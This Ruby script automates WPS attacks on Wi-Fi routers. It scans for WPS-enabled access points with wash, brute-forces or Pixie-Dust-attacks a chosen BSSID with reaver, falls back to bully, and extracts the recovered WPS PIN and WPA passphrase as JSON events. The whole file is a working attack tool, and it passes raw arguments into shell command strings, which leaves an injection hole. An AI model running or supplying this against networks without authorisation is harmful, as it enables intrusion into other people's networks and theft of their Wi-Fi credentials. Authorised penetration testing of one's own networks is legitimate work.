#!/usr/bin/env ruby
# frozen_string_literal: true

require 'json'
require 'time'
require 'open3'

begin
  iface = ARGV[0]
  bssid = ARGV[1] || ''
  pin = ARGV[2] || ''
  channel = (ARGV[3] || 0).to_i
  timeout = (ARGV[4] || 120).to_i
  method = ARGV[5] || 'pixiedust'

  raise 'interface required' unless iface

  stdout, stderr, status = Open3.capture3("iw dev #{iface} info 2>/dev/null")
  unless stdout.include?('type monitor')
    puts JSON.generate({ event: 'monitor_fail', iface: iface,
      data: { message: 'Interface not in monitor mode' },
      timestamp: Time.now.iso8601 })
    $stdout.flush
  end

  if bssid.empty?
    puts JSON.generate({ event: 'wps_scan', iface: iface,
      data: { method: 'wash' }, timestamp: Time.now.iso8601 })
    $stdout.flush

    stdout, stderr, status = Open3.capture3("wash -i #{iface} 2>/dev/null")
    ap_count = 0
    header = true
    stdout.each_line do |line|
      if header
        header = false if line.include?('BSSID')
        next
      end
      if (b = line.match(/^\s*([0-9a-fA-F:]+)/))
        ch = line.match(/\s+(\d+)\s+/)&.[](1) || ''
        rssi = line.match(/\s+(-?\d+)\s+/)&.[](1) || ''
        locked = line.include?('Yes') ? 'Yes' : 'No'
        puts JSON.generate({ event: 'wps_ap', iface: iface, bssid: b[1],
          data: { channel: ch, signal: rssi, locked: locked },
          timestamp: Time.now.iso8601 })
        $stdout.flush
        ap_count += 1
      end
    end
    puts JSON.generate({ event: 'wps_scan_complete', iface: iface,
      data: { aps_found: ap_count }, timestamp: Time.now.iso8601 })
    $stdout.flush
    exit 0
  end

  system("iw dev #{iface} set channel #{channel} 2>/dev/null") if channel > 0

  puts JSON.generate({ event: 'crack_start', iface: iface, bssid: bssid,
    data: { method: method, pin: pin.empty? ? 'auto' : pin, timeout: timeout },
    timestamp: Time.now.iso8601 })
  $stdout.flush

  cmd = "reaver -i #{iface} -b #{bssid} -vvv -t #{timeout}"
  cmd += " -p #{pin}" unless pin.empty?
  cmd += " -c #{channel}" if channel > 0
  cmd += ' 2>&1'

  stdout, stderr, status = Open3.capture3(cmd)
  found_pin = stdout[/WPS PIN: '([^']+)'/, 1] || ''
  found_psk = stdout[/WPA PSK: '([^']+)'/, 1] || ''

  if found_pin.empty? && found_psk.empty?
    puts JSON.generate({ event: 'fallback', iface: iface,
      data: { method: 'bully' }, timestamp: Time.now.iso8601 })
    $stdout.flush

    bully_cmd = "bully -i #{iface} -b #{bssid} -v 3"
    bully_cmd += " -p #{pin}" unless pin.empty?
    bully_cmd += " -c #{channel}" if channel > 0
    bully_cmd += ' -d' if method == 'pixiedust'
    bully_cmd += ' 2>&1'

    stdout, stderr, status = Open3.capture3(bully_cmd)
    found_pin = stdout[/PIN: '([^']+)'/, 1] || found_pin
    found_psk = stdout[/Key: '([^']+)'/, 1] || found_psk
  end

  puts JSON.generate({ event: 'crack_complete', iface: iface, bssid: bssid,
    data: { pin: found_pin, psk: found_psk, success: (!found_pin.empty? || !found_psk.empty?).to_s },
    timestamp: Time.now.iso8601 })
  $stdout.flush

rescue Interrupt
  puts JSON.generate({ event: 'crack_interrupted', iface: iface || '',
    bssid: bssid, data: { status: 'interrupted' },
    timestamp: Time.now.iso8601 })
rescue => e
  $stderr.puts JSON.generate({ event: 'error', data: { message: e.message,
    backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601 })
  exit 1
end
